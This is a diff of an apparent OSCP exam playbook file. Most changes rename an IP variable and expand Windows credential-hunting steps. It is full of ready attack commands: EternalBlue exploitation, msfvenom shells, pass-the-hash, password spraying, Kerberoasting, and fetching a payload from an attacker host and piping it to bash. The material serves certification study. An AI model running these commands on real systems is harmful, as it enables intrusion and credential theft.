@@ -3910,7 +3910,7 @@ nc -nlvp 80
 # Hook: <script src="http://$LHOST:3000/hook.js"></script>
 
 # CSP bypass check
-curl -sv http://$IP | grep -i "content-security-policy"`,
+curl -sv http://$ip | grep -i "content-security-policy"`,
     warn: null,
     choices: [
       { label: "Stole admin cookie — hijacked session", next: "file_upload" },
@@ -3929,7 +3929,7 @@ searchsploit --www <service> # open on exploit-db.com
 searchsploit -s apache 2.4.49  # strict version match — no fuzzy range
 
 # Best workflow: nmap XML output piped straight into searchsploit
-nmap -p <PORTS> -sV -oX targeted.xml $IP
+nmap -p <PORTS> -sV -oX targeted.xml $ip
 searchsploit --nmap targeted.xml
 # reads every detected service/version and searches all at once
 
@@ -3939,7 +3939,7 @@ searchsploit --nmap targeted.xml
 # Google: "<service> <version> exploit site:github.com"
 
 # Most Python exploits just need:
-python3 exploit.py $IP $LHOST $LPORT
+python3 exploit.py $ip $LHOST $LPORT
 
 # Decode suspicious hex arrays before trusting them:
 python3 -c "print(b'\\x72\\x6d\\x20\\x2d\\x72\\x66...')"`,
@@ -3964,7 +3964,7 @@ nc -lvnp $LPORT
 
 # Apache James 2.3.2 example — payload fires on SSH login
 # After exploit runs: trigger it manually
-ssh -p <james_ssh_port> <created_user>@$IP
+ssh -p <james_ssh_port> <created_user>@$ip
 # James creates a user via admin port, sends payload via SMTP
 # Payload lands in user home dir and executes on next login
 
@@ -3974,7 +3974,7 @@ ssh -p <james_ssh_port> <created_user>@$IP
 # - Check if a cron is already running as that user
 
 # Confirm payload was staged — reconnect to admin port and verify user exists:
-nc $IP <admin_port>
+nc $ip <admin_port>
 # login: james / james  (or root / root)
 # listusers`,
     warn: "Don't wait 20 minutes staring at a listener. While it sits open: enumerate other services, check for creds, try SSH on both ports. If you can't force the trigger — note it, move on, come back. On exam day flag this box and check back after pivoting elsewhere.",
@@ -4009,7 +4009,7 @@ x86_64-w64-mingw32-gcc exploit.c -o exploit64.exe -lws2_32
 
 # -- Step 3: fix hardcoded IP and port ----------------
 grep -n "inet_addr\\|sin_port\\|htons" exploit.c
-# inet_addr("x.x.x.x")  →  inet_addr("$IP")   // converts IP string to network addr
+# inet_addr("x.x.x.x")  →  inet_addr("$ip")   // converts IP string to network addr
 # htons(80)              →  htons(<port>)       // converts port to network byte order
 
 # -- Step 4: return address ----------------------------
@@ -4188,16 +4188,16 @@ msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread 
     title: "SMB Enumeration",
     body: "SMB is information-rich. Null session, guest access, share contents, user enumeration. EternalBlue check is mandatory.",
     cmd: `# Full enum
-enum4linux-ng -A $IP | tee scans/smb_enum.txt
+enum4linux-ng -A $ip | tee scans/smb_enum.txt
 
 # CME — null + guest
-crackmapexec smb $IP -u '' -p '' --shares
-crackmapexec smb $IP -u 'guest' -p '' --shares
-crackmapexec smb $IP -u '' -p '' --users
+crackmapexec smb $ip -u '' -p '' --shares
+crackmapexec smb $ip -u 'guest' -p '' --shares
+crackmapexec smb $ip -u '' -p '' --users
 
 # List + browse shares
-smbclient -L //$IP -N
-smbclient //$IP/share -N
+smbclient -L //$ip -N
+smbclient //$ip/share -N
 
 # Vuln check
 # Full SMB NSE — enum + vuln
@@ -4236,10 +4236,10 @@ chmod +x shellcode/shell_prep.sh
 nc -nlvp $LPORT
 
 # Fire exploit
-python3 eternalblue_exploit7.py $IP shellcode/sc_x64.bin
+python3 eternalblue_exploit7.py $ip shellcode/sc_x64.bin
 
 # If x64 fails, try x86
-python3 eternalblue_exploit7.py $IP shellcode/sc_x86.bin`,
+python3 eternalblue_exploit7.py $ip shellcode/sc_x86.bin`,
     warn: "AutoBlue can crash the target if it's unstable. Revert the machine if it goes unresponsive.",
     choices: [
       { label: "Got SYSTEM shell!", next: "windows_post_exploit" },
@@ -4252,11 +4252,11 @@ python3 eternalblue_exploit7.py $IP shellcode/sc_x86.bin`,
     title: "SMB Loot",
     body: "Recursively download everything. Grep for credentials, keys, configs. Don't read files one by one — bulk download and grep.",
     cmd: `# Recursive download
-smbclient //$IP/share -N \\
+smbclient //$ip/share -N \\
   -c 'recurse ON; prompt OFF; mget *'
 
 # Mount the share
-sudo mount -t cifs //$IP/share /mnt/share \\
+sudo mount -t cifs //$ip/share /mnt/share \\
   -o username=,password=,vers=2.0
 
 # Bulk grep for creds
@@ -4304,12 +4304,12 @@ dnspy binary.exe   # GUI`,
     title: "FTP Enumeration",
     body: "Anonymous login is more common than people expect. If writable AND web-accessible, you can drop a shell directly.",
     cmd: `# Anonymous login test
-ftp $IP
+ftp $ip
 # Try: anonymous / anonymous
 #      anonymous / (blank)
 
 # Nmap scripts
-nmap --script ftp-anon,ftp-bounce,ftp-syst -p 21 $IP
+nmap --script ftp-anon,ftp-bounce,ftp-syst -p 21 $ip
 
 # If login works — download everything
 ftp> binary
@@ -4334,16 +4334,16 @@ ftp> put shell.php`,
     title: "SSH Only Exposed",
     body: "SSH alone is rarely the initial attack vector. You need creds or a key from somewhere. Check non-standard web ports — something else is almost always running.",
     cmd: `# Check non-standard ports
-nmap -p 8000,8080,8443,8888,9000,9090,3000,5000 $IP
+nmap -p 8000,8080,8443,8888,9000,9090,3000,5000 $ip
 
 # SSH version / algo audit
-ssh-audit $IP
+ssh-audit $ip
 
 # Banner grab
-nc -nv $IP 22
+nc -nv $ip 22
 
 # Username enum (if older OpenSSH)
-ssh-user-enum.py -U /opt/SecLists/Usernames/Names/names.txt -t $IP`,
+ssh-user-enum.py -U /opt/SecLists/Usernames/Names/names.txt -t $ip`,
     warn: "Brute forcing SSH without a targeted username list is almost never the path.",
     choices: [
       { label: "Found web on non-standard port", next: "web_enum" },
@@ -4357,8 +4357,8 @@ ssh-user-enum.py -U /opt/SecLists/Usernames/Names/names.txt -t $IP`,
     title: "SSH Key Found",
     body: "Always check permissions first — SSH will refuse a key that's world-readable. If passphrase-protected, crack it with ssh2john.",
     cmd: `chmod 600 id_rsa
-ssh -i id_rsa user@$IP
-ssh -i id_rsa -o StrictHostKeyChecking=no user@$IP
+ssh -i id_rsa user@$ip
+ssh -i id_rsa -o StrictHostKeyChecking=no user@$ip
 
 # Crack passphrase
 ssh2john id_rsa > id_rsa.hash
@@ -4367,7 +4367,7 @@ hashcat -m 22921 id_rsa.hash /usr/share/wordlists/rockyou.txt
 
 # Try all users from /etc/passwd
 for user in $(cat users.txt); do
-  ssh -i id_rsa $user@$IP -o StrictHostKeyChecking=no 2>/dev/null && echo "HIT: $user"
+  ssh -i id_rsa $user@$ip -o StrictHostKeyChecking=no 2>/dev/null && echo "HIT: $user"
 done`,
     warn: null,
     choices: [
@@ -4384,27 +4384,27 @@ done`,
     title: "Other Services",
     body: "SNMP leaks configs and community strings. DNS zone transfers can reveal the whole network map. LDAP and RPC enumerate users without authentication.",
     cmd: `# SNMP — community string brute + walk
-onesixtyone -c /opt/SecLists/Discovery/SNMP/snmp.txt $IP
-snmpwalk -c public -v1 $IP
-snmp-check $IP
+onesixtyone -c /opt/SecLists/Discovery/SNMP/snmp.txt $ip
+snmpwalk -c public -v1 $ip
+snmp-check $ip
 
 # DNS zone transfer
-dig axfr @$IP domain.com
-host -l domain.com $IP
+dig axfr @$ip domain.com
+host -l domain.com $ip
 dnsrecon -d domain.com -t axfr
 
 # LDAP anonymous bind
-ldapsearch -x -h $IP -b "dc=domain,dc=com"
-ldapsearch -x -h $IP -b "" -s base namingContexts
+ldapsearch -x -h $ip -b "dc=domain,dc=com"
+ldapsearch -x -h $ip -b "" -s base namingContexts
 
 # RPC null session
-rpcclient -U "" $IP
+rpcclient -U "" $ip
 > enumdomusers
 > enumdomgroups
 > queryuser <RID>
 
 # NFS shares
-showmount -e $IP`,
+showmount -e $ip`,
     warn: null,
     choices: [
       { label: "Got usernames from SNMP/LDAP/RPC", next: "bruteforce" },
@@ -4623,18 +4623,18 @@ john hash.txt --show`,
     title: "Credentials Found",
     body: "Spray those creds on every service immediately. Password reuse is the most consistent win on OSCP. Same user, same password, different service.",
     cmd: `# Try everything
-ssh user@$IP
-evil-winrm -i $IP -u user -p 'password'
-crackmapexec smb $IP -u user -p 'password'
-crackmapexec winrm $IP -u user -p 'password'
-smbclient //$IP/share -U user
-ftp $IP   # try creds manually
-mysql -u user -p'password' -h $IP
+ssh user@$ip
+evil-winrm -i $ip -u user -p 'password'
+crackmapexec smb $ip -u user -p 'password'
+crackmapexec winrm $ip -u user -p 'password'
+smbclient //$ip/share -U user
+ftp $ip   # try creds manually
+mysql -u user -p'password' -h $ip
 
 # Check all share access with creds
-crackmapexec smb $IP -u user -p 'password' --shares
-crackmapexec smb $IP -u user -p 'password' --users
-crackmapexec smb $IP -u user -p 'password' --groups`,
+crackmapexec smb $ip -u user -p 'password' --shares
+crackmapexec smb $ip -u user -p 'password' --users
+crackmapexec smb $ip -u user -p 'password' --groups`,
     warn: null,
     choices: [
       { label: "SSH / shell access — Linux machine", next: "linux_post_exploit" },
@@ -4788,7 +4788,7 @@ msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f elf -o bind.elf
 msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe -o bind.exe
 
 # -- CONNECT FROM ATTACKER -----------------
-nc $IP 4444`,
+nc $ip 4444`,
     warn: "Bind shells on OSCP exam machines are risky — another candidate could connect to your bind shell. Use a non-obvious port and close it when done. Reverse shells are always preferred.",
     choices: [
       { label: "Bind shell connected — upgrade TTY", next: "shell_upgrade" },
@@ -5027,7 +5027,7 @@ export PATH=/tmp:$PATH`,
     cmd: `getcap -r / 2>/dev/null
 # python3 cap_setuid → python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 
-cat /etc/exports && showmount -e $IP
+cat /etc/exports && showmount -e $ip
 
 ls -la /etc/passwd
 openssl passwd -1 -salt x pass123
@@ -5140,59 +5140,81 @@ Get-ChildItem "C:\\Program Files", "C:\\Program Files (x86)" | select Name
 Get-Process
 # Cross-ref PIDs with netstat
 
-# Get full binary path for each process — spot non-standard ones
+# Get full binary path — spot non-standard processes
 Get-Process | Sort-Object ProcessName | Select Id,ProcessName,Path
-
-# Find non-standard processes — filter out Windows + Program Files
+# Filter out standard Windows paths
 Get-Process | Select Id,ProcessName,Path | Where Path -notlike "*Windows*" | Where Path -notlike "*Program Files*"
-
-# Once you spot something unusual — get its directory and check for flags
+# Get path of a specific process
 Get-Process -Name NonStandardProcess | Select -Expand Path
-# Then: Get-ChildItem "C:\path\to\dir\\" | type local.txt
+# Then check that directory for flags/creds
 
 # ── STEP 8: SCHEDULED TASKS ───────────────────────────
 schtasks /query /fo LIST /v
-Get-ScheduledTask | Where TaskPath -notlike "\\\\Microsoft*" | Select TaskName,TaskPath
+Get-ScheduledTask | Where TaskPath -notlike "\\Microsoft*" | Select TaskName,TaskPath
 
 # ── STEP 9: SERVICES ──────────────────────────────────
 Get-CimInstance Win32_Service | Where State -eq "Running" | Select Name,PathName
 wmic service get name,pathname
 
-# ── STEP 10: SENSITIVE INFO ───────────────────────────
+# ── STEP 10: POWERSHELL HISTORY (Module 17.1.4) ───────
+# PSReadline history — survives Clear-History
+# Most admins run Clear-History thinking it clears everything — it doesnt
+(Get-PSReadlineOption).HistorySavePath
 type C:\\Users\\$env:USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
 Get-History
+
+# ── STEP 11: POWERSHELL TRANSCRIPTS ──────────────────
+# Transcript files = over-the-shoulder recording of PS sessions
+# Often contain plaintext passwords from PSCredential creation
+# Common locations:
+Get-ChildItem -Path C:\\Users -Include *transcript* -Recurse -EA SilentlyContinue
+Get-ChildItem -Path C:\\Users\\Public -Recurse -EA SilentlyContinue
+type C:\\Users\\Public\\Transcripts\\transcript01.txt
+# Also check:
+# C:\Users\<user>\Documents\PowerShell_transcript.<host>.<random>.<timestamp>.txt
+# C:\Transcripts\
+
+# ── STEP 12: SCRIPT BLOCK LOGGING ────────────────────
+# Check if Script Block Logging is enabled:
+reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging"
+# View logs via Event Viewer: Applications and Services Logs > Microsoft > Windows > PowerShell > Operational
+# Or via PowerShell:
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Select -First 20 | Format-List
+# Filter for creds:
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where Message -like "*password*" | Format-List
+
+# ── STEP 13: SENSITIVE INFO ───────────────────────────
 cmdkey /list
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
 
-# AlwaysInstallElevated — if both = 1, MSI runs as SYSTEM
+# AlwaysInstallElevated
 reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
 reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
 
-# ── STEP 11: CREDENTIAL FILES ─────────────────────────
-Get-ChildItem -Path C:\\ -Include unattend.xml,sysprep.xml,sysprep.inf -Recurse -EA SilentlyContinue
+# ── STEP 14: CREDENTIAL FILES ─────────────────────────
+Get-ChildItem -Path C:\ -Include unattend.xml,sysprep.xml,sysprep.inf -Recurse -EA SilentlyContinue
 type C:\\Windows\\Panther\\Unattend.xml
 type C:\\Windows\\System32\\sysprep\\sysprep.xml
 type C:\\Users\\$env:USERNAME\\AppData\\Roaming\\FileZilla\\sitemanager.xml
 type C:\\xampp\\mysql\\bin\\my.ini
-type C:\\xampp\\phpMyAdmin\\config.inc.php
 Get-ChildItem -Path C:\\inetpub -Include web.config -Recurse -EA SilentlyContinue | Get-Content
 Get-ChildItem Env: | Select Name,Value
 
-# ── STEP 12: GRAB FLAGS ───────────────────────────────
+# ── STEP 15: GRAB FLAGS ───────────────────────────────
 type C:\\Users\\$env:USERNAME\\Desktop\\local.txt
 Get-ChildItem -Path C:\\Users -Include local.txt,proof.txt -Recurse -EA SilentlyContinue | Get-Content
 
-# ── HIGH VALUE TARGETS FROM MODULE 17 ────────────────
-# KeePass       -> keepass2john -> crack master password
-# FileZilla     -> sitemanager.xml for saved creds
-# XAMPP         -> MySQL config for creds
-# AdminTeam / BackupAdmin / daveadmin -> admin account variants
-# Unquoted service paths -> writable dir = hijack
-# Scheduled tasks -> writable script = SYSTEM execution
-# SeImpersonatePrivilege -> GodPotato = instant SYSTEM`,
-    warn: "Read whoami /priv before anything else — SeImpersonatePrivilege is instant SYSTEM via GodPotato. PowerShell history is the most underrated vector on OSCP. KeePass and FileZilla installs almost always contain credentials.",
+# ── HIGH VALUE TARGETS ────────────────────────────────
+# PSReadline history -> passwords typed in commands
+# Transcript files   -> PSCredential creation with plaintext passwords
+# Script Block Logs  -> encoded commands decoded automatically
+# KeePass            -> keepass2john -> crack master password
+# FileZilla          -> sitemanager.xml for saved creds
+# XAMPP              -> my.ini for MySQL creds (try all users)
+# whoami /priv       -> SeImpersonatePrivilege = instant SYSTEM via GodPotato`,
+    warn: "PSReadline history survives Clear-History — always check it. Transcript files often contain PSCredential creation commands with plaintext passwords. Re-enumerate fully after gaining each new user account — permissions change and you unlock new files.",
     choices: [
       { label: "SeImpersonatePrivilege in whoami /priv", next: "token_privs" },
       { label: "Second NIC in ipconfig — pivot opportunity", next: "pivot_start" },
@@ -5207,47 +5229,67 @@ Get-ChildItem -Path C:\\Users -Include local.txt,proof.txt -Recurse -EA Silently
 
 
 
+
   winpeas: {
     phase: "WINDOWS",
-    title: "WinPEAS",
-    body: "Transfer and run. Read RED findings first. Key areas: token privs, service vulns, stored creds, AlwaysInstallElevated, unquoted paths.",
-    cmd: `# Transfer (python3 -m http.server 80 on attacker)
+    title: "WinPEAS + Automated Enum",
+    body: "Run winPEAS but never rely on it alone. Module 17.1.5: winPEAS missed the meeting note, PSReadline history, and transcript file — the exact vectors that led to privesc. Use it for speed, supplement with manual checks.",
+    cmd: `# ── TRANSFER WINPEAS ─────────────────────────────────
+# On Kali:
+cp /usr/share/peass/winpeas/winPEASx64.exe .
+python3 -m http.server 80
+# On target:
 iwr http://$LHOST/winPEASx64.exe -OutFile C:\\Windows\\Temp\\wp.exe
 .\\wp.exe
 
-# PowerUp — great for service vulns and unquoted paths
+# ── READ OUTPUT ──────────────────────────────────────
+# RED   = misconfigured / special privilege — investigate immediately
+# GREEN = protection enabled / well configured
+# Focus areas in order:
+# 1. Current user privileges (SeImpersonate etc)
+# 2. Users and groups
+# 3. Password files in home dirs
+# 4. Services — unquoted paths, weak perms
+# 5. Scheduled tasks
+# 6. AlwaysInstallElevated
+# 7. Installed software versions
+
+# ── WINPEAS KNOWN GAPS (Module 17.1.5) ──────────────
+# winPEAS MISSED on CLIENTWK220:
+# - asdf.txt on dave desktop (meeting notes with password)
+# - PSReadline history file with Set-Secret password
+# - Transcript file in C:\\Users\\Public\\Transcripts
+# Always do manual checks even after running winPEAS
+
+# ── POWERUP ──────────────────────────────────────────
 iwr http://$LHOST/PowerUp.ps1 -OutFile C:\\Windows\\Temp\\pu.ps1
 . .\\pu.ps1
 Invoke-AllChecks
 
-# Seatbelt — targeted host survey
-.\\Seatbelt.exe -group=all
-.\\Seatbelt.exe -group=system -outputfile C:\\Windows\\Temp\\seatbelt.txt
-
-# PrivescCheck — comprehensive, good output
+# ── PRIVESCCHECK ─────────────────────────────────────
 iwr http://$LHOST/PrivescCheck.ps1 -OutFile C:\\Windows\\Temp\\pc.ps1
 powershell -ep bypass -c ". .\\pc.ps1; Invoke-PrivescCheck"
 powershell -ep bypass -c ". .\\pc.ps1; Invoke-PrivescCheck -Extended"
 
-# WES-NG — feed systeminfo to find kernel exploits
-# On target:
+# ── SEATBELT ─────────────────────────────────────────
+.\\Seatbelt.exe -group=all
+.\\Seatbelt.exe -group=system -outputfile C:\\Windows\\Temp\\seatbelt.txt
+
+# ── WES-NG (kernel exploits from systeminfo) ─────────
 systeminfo > C:\\Windows\\Temp\\sysinfo.txt
 # Transfer sysinfo.txt to Kali then:
-# python3 wes.py sysinfo.txt
-# python3 wes.py --update && python3 wes.py sysinfo.txt
-
-# Watson / windows-exploit-suggester — alternative kernel exploit finder
-# ./windows-exploit-suggester.py --database mssb.xlsx --systeminfo sysinfo.txt`,
-    warn: null,
+# python3 wes.py --update && python3 wes.py sysinfo.txt`,
+    warn: "winPEAS is fast but NOT comprehensive. Always check PSReadline history, transcript files, and desktop/home dirs manually — winPEAS consistently misses these. Red findings are high priority but manual enum often finds the actual path.",
     choices: [
       { label: "SeImpersonatePrivilege found", next: "token_privs" },
       { label: "Unquoted service path found", next: "unquoted_service" },
       { label: "AlwaysInstallElevated found", next: "always_install_elevated" },
       { label: "Weak service permissions", next: "weak_service" },
       { label: "Stored creds / SAM", next: "windows_creds" },
-      { label: "Nothing clear — scheduled tasks / manual", next: "windows_manual_enum" },
+      { label: "Nothing clear — check PS history/transcripts", next: "windows_post_exploit" },
     ],
   },
+
 
   token_privs: {
     phase: "WINDOWS",
@@ -5393,15 +5435,15 @@ impacket-secretsdump -sam sam -system system LOCAL
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -EA SilentlyContinue
 
 # Search XAMPP config files
-Get-ChildItem -Path C:\\xampp -Include *.txt,*.ini -File -Recurse -EA SilentlyContinue
+Get-ChildItem -Path C:\\xampp -Include *.txt,*.ini,*.conf,*.php,*.config -File -Recurse -EA SilentlyContinue
 type C:\\xampp\\passwords.txt
 type C:\\xampp\\mysql\\bin\\my.ini
 
 # Search user home dirs for documents
-Get-ChildItem -Path C:\\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -EA SilentlyContinue
+Get-ChildItem -Path C:\\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.config,*.ps1,*.bat,*.log,*.bak -File -Recurse -EA SilentlyContinue
 
 # Broad password file search
-Get-ChildItem -Path C:\ -Include *pass*,*cred*,*secret*,*.kdbx -File -Recurse -EA SilentlyContinue
+Get-ChildItem -Path C:\ -Include *pass*,*cred*,*secret*,*vnc*,*.kdbx,*config*,*unattend* -File -Recurse -EA SilentlyContinue
 
 # cmd-style search
 dir /s /b C:\\Users\\*.xml
@@ -5456,22 +5498,22 @@ Get-ChildItem -Path C:\\inetpub -Include web.config -Recurse -EA SilentlyContinu
     title: "Pass the Hash",
     body: "NTLM hashes authenticate without cracking. evil-winrm, psexec, wmiexec — all work with hashes directly. nxc/cme confirm which services accept the hash before you connect.",
     cmd: `# -- Verify hash works first --------------
-nxc smb $IP -u administrator -H <NTLM_HASH>
-nxc winrm $IP -u administrator -H <NTLM_HASH>
+nxc smb $ip -u administrator -H <NTLM_HASH>
+nxc winrm $ip -u administrator -H <NTLM_HASH>
 # (Pwn3d!) = local admin confirmed
 
 # -- Connect -------------------------------
 # evil-winrm (WinRM 5985/5986)
-evil-winrm -i $IP -u administrator -H <NTLM_HASH>
+evil-winrm -i $ip -u administrator -H <NTLM_HASH>
 
 # impacket-psexec — drops binary, noisier
-impacket-psexec domain/administrator@$IP -hashes :NTLM_HASH
+impacket-psexec domain/administrator@$ip -hashes :NTLM_HASH
 
 # impacket-wmiexec — stealthier, no binary drop
-impacket-wmiexec domain/administrator@$IP -hashes :NTLM_HASH
+impacket-wmiexec domain/administrator@$ip -hashes :NTLM_HASH
 
 # impacket-smbexec
-impacket-smbexec domain/administrator@$IP -hashes :NTLM_HASH
+impacket-smbexec domain/administrator@$ip -hashes :NTLM_HASH
 
 # -- Spray hash across subnet --------------
 nxc smb $SUBNET/24 -u administrator -H <NTLM_HASH> --continue-on-success`,
@@ -5688,32 +5730,32 @@ type C:\\Users\\Administrator\\Desktop\\proof.txt
     title: "Active Directory — Assumed Breach",
     body: "OSCP+ gives you low-priv domain creds. You're starting inside. Add DC to /etc/hosts, enumerate the domain, run BloodHound immediately.",
     cmd: `# Add DC to hosts
-echo "$IP dc01.domain.com domain.com" >> /etc/hosts
+echo "$ip dc01.domain.com domain.com" >> /etc/hosts
 
 # -- Verify connectivity -----------------------
 # nxc (netexec) — CME successor, same syntax, actively maintained
-nxc smb $IP -u user -p 'pass'
-crackmapexec smb $IP -u user -p 'pass'   # fallback if nxc not installed
+nxc smb $ip -u user -p 'pass'
+crackmapexec smb $ip -u user -p 'pass'   # fallback if nxc not installed
 
 # -- Initial domain recon ----------------------
-nxc smb $IP -u user -p 'pass' --users
-nxc smb $IP -u user -p 'pass' --groups
-nxc smb $IP -u user -p 'pass' --shares
-nxc smb $IP -u user -p 'pass' --pass-pol   # CHECK LOCKOUT BEFORE SPRAYING
+nxc smb $ip -u user -p 'pass' --users
+nxc smb $ip -u user -p 'pass' --groups
+nxc smb $ip -u user -p 'pass' --shares
+nxc smb $ip -u user -p 'pass' --pass-pol   # CHECK LOCKOUT BEFORE SPRAYING
 
 # -- ldapdomaindump — fast HTML/JSON AD dump ---
 # Outputs users, groups, computers as HTML + JSON
-ldapdomaindump -u 'domain\\user' -p 'pass' $IP -o /tmp/ldd/
+ldapdomaindump -u 'domain\\user' -p 'pass' $ip -o /tmp/ldd/
 # Open domain_users.html and domain_groups.html for quick visual map
 
 # -- windapsearch — LDAP enum without domain join --
-windapsearch --dc-ip $IP -d domain.com -u user@domain.com -p 'pass' -m users
-windapsearch --dc-ip $IP -d domain.com -u user@domain.com -p 'pass' -m groups
-windapsearch --dc-ip $IP -d domain.com -u user@domain.com -p 'pass' -m computers
-windapsearch --dc-ip $IP -d domain.com -u user@domain.com -p 'pass' -m privileged-users
+windapsearch --dc-ip $ip -d domain.com -u user@domain.com -p 'pass' -m users
+windapsearch --dc-ip $ip -d domain.com -u user@domain.com -p 'pass' -m groups
+windapsearch --dc-ip $ip -d domain.com -u user@domain.com -p 'pass' -m computers
+windapsearch --dc-ip $ip -d domain.com -u user@domain.com -p 'pass' -m privileged-users
 
 # -- ldapsearch — raw fallback -----------------
-ldapsearch -x -h $IP -D "user@domain.com" -w 'pass' \
+ldapsearch -x -h $ip -D "user@domain.com" -w 'pass' \
   -b "dc=domain,dc=com" "(objectClass=user)" | grep sAMAccountName`,
     warn: "Check password policy BEFORE any spraying — nxc smb --pass-pol. Lockouts on the exam are catastrophic. ldapdomaindump HTML output is the fastest way to visually map the domain before BloodHound finishes. nxc is the maintained fork of crackmapexec — prefer it where installed.",
     choices: [
@@ -5732,7 +5774,7 @@ ldapsearch -x -h $IP -D "user@domain.com" -w 'pass' \
     body: "Run this early and let it collect in the background. BloodHound will show you paths you'd never find manually. Shortest Path to DA is your first query.",
     cmd: `# bloodhound-python from Kali (no agent needed)
 bloodhound-python -u user -p 'pass' \\
-  -d domain.com -ns $IP -c All
+  -d domain.com -ns $ip -c All
 
 # Or SharpHound from Windows target
 iwr http://$LHOST/SharpHound.exe -OutFile C:\\Windows\\Temp\\sh.exe
@@ -5766,16 +5808,16 @@ bloodhound
     body: "Accounts with pre-auth disabled hand you encrypted TGTs to crack offline. Fast, no noise, no lockout risk.",
     cmd: `# From Kali — no password needed if pre-auth disabled
 impacket-GetNPUsers domain.com/ \\
-  -usersfile users.txt -dc-ip $IP \\
+  -usersfile users.txt -dc-ip $ip \\
   -request -outputfile asrep.txt
 
 # With creds (more reliable)
 impacket-GetNPUsers domain.com/user:'pass' \\
-  -dc-ip $IP -request -o asrep.kerb
+  -dc-ip $ip -request -o asrep.kerb
 
 # Kerbrute (also finds them)
 ./kerbrute_linux_amd64 userenum \\
-  -d domain.com --dc $IP \\
+  -d domain.com --dc $ip \\
   /opt/SecLists/Usernames/Names/names.txt
 
 # Crack
@@ -5794,11 +5836,11 @@ hashcat -m 18200 asrep.txt rockyou.txt -r best64.rule`,
     body: "Request service tickets for any SPN-enabled account and crack them offline. Service accounts often have weak passwords.",
     cmd: `# From Kali with creds
 impacket-GetUserSPNs domain.com/user:'pass' \\
-  -dc-ip $IP -request -outputfile tgs.txt
+  -dc-ip $ip -request -outputfile tgs.txt
 
 # Check what accounts exist
 impacket-GetUserSPNs domain.com/user:'pass' \\
-  -dc-ip $IP
+  -dc-ip $ip
 
 # PowerView on Windows
 Get-NetUser -SPN | select samaccountname,serviceprincipalname
@@ -5821,21 +5863,21 @@ hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule`,
     title: "Password Spraying",
     body: "One password across all users. Seasonal passwords, company name variants, default creds. One attempt per account per window to avoid lockout.",
     cmd: `# CHECK POLICY FIRST — before any spraying
-nxc smb $IP -u user -p 'pass' --pass-pol
-crackmapexec smb $IP -u user -p 'pass' --pass-pol   # fallback
+nxc smb $ip -u user -p 'pass' --pass-pol
+crackmapexec smb $ip -u user -p 'pass' --pass-pol   # fallback
 
 # Spray with nxc (netexec) — preferred, CME successor
-nxc smb $IP -u users.txt -p 'Password123!' --continue-on-success
-nxc smb $IP -u users.txt -p 'Winter2025!' --continue-on-success
+nxc smb $ip -u users.txt -p 'Password123!' --continue-on-success
+nxc smb $ip -u users.txt -p 'Winter2025!' --continue-on-success
 
 # Also spray other services simultaneously
-nxc winrm $IP -u users.txt -p 'Password123!'
-nxc rdp   $IP -u users.txt -p 'Password123!'
-nxc ssh   $IP -u users.txt -p 'Password123!'
+nxc winrm $ip -u users.txt -p 'Password123!'
+nxc rdp   $ip -u users.txt -p 'Password123!'
+nxc ssh   $ip -u users.txt -p 'Password123!'
 
 # Kerbrute spray — faster, fewer logon events than LDAP
 ./kerbrute_linux_amd64 passwordspray \
-  -d domain.com --dc $IP \
+  -d domain.com --dc $ip \
   users.txt 'Password123!'
 
 # Common spray passwords:
@@ -6042,7 +6084,7 @@ mkdir -p ~/exam/{machine1,machine2,machine3,ad}/{scans,exploits,loot,screenshots
 # Close unnecessary terminals. One window.
 # Write down — right now — what you actually know:
 
-echo "Machine: $IP"
+echo "Machine: $ip"
 echo "Ports open: [list them]"
 echo "Services: [list them]"
 echo "What I tried: [list it]"
@@ -6139,7 +6181,7 @@ wget -c http://$LHOST/bigfile.tar.gz -O /tmp/f.tgz   # resume interrupted
 wget -b http://$LHOST/linpeas.sh -O /tmp/lp.sh        # background download
 wget --user=user --password=pass http://$LHOST/file   # authenticated
 # POST request via wget
-wget --post-data="cmd=id" http://$IP/exec.php -O -
+wget --post-data="cmd=id" http://$ip/exec.php -O -
 
 # curl — fallback if wget missing
 curl http://$LHOST/linpeas.sh -o /tmp/lp.sh
@@ -6155,7 +6197,7 @@ curl http://$LHOST/shell.elf | bash                   # fileless — never touch
 # Target:   echo "BASE64" | base64 -d > /tmp/lp.sh
 
 # SCP (if SSH available)
-scp linpeas.sh user@$IP:/tmp/lp.sh
+scp linpeas.sh user@$ip:/tmp/lp.sh
 
 # -- WINDOWS: DOWNLOAD TO TARGET ----------
 # -- certutil (LOLBin — built-in, hard to block) --
@@ -6251,20 +6293,20 @@ export HASH='aad3b435b51404eeaad3b435b51404ee:NTLMHASH'
 
 # -- NXC (NETEXEC) — SPRAY ALL SERVICES --
 # nxc = netexec, maintained successor to crackmapexec (same syntax)
-nxc smb   $IP -u $USER -p $PASS
-nxc smb   $IP -u $USER -H $HASH   # Pass-the-Hash
-nxc winrm $IP -u $USER -p $PASS
-nxc ssh   $IP -u $USER -p $PASS
-nxc rdp   $IP -u $USER -p $PASS
-nxc ftp   $IP -u $USER -p $PASS
-nxc mssql $IP -u $USER -p $PASS
+nxc smb   $ip -u $USER -p $PASS
+nxc smb   $ip -u $USER -H $HASH   # Pass-the-Hash
+nxc winrm $ip -u $USER -p $PASS
+nxc ssh   $ip -u $USER -p $PASS
+nxc rdp   $ip -u $USER -p $PASS
+nxc ftp   $ip -u $USER -p $PASS
+nxc mssql $ip -u $USER -p $PASS
 
 # Spray across subnet
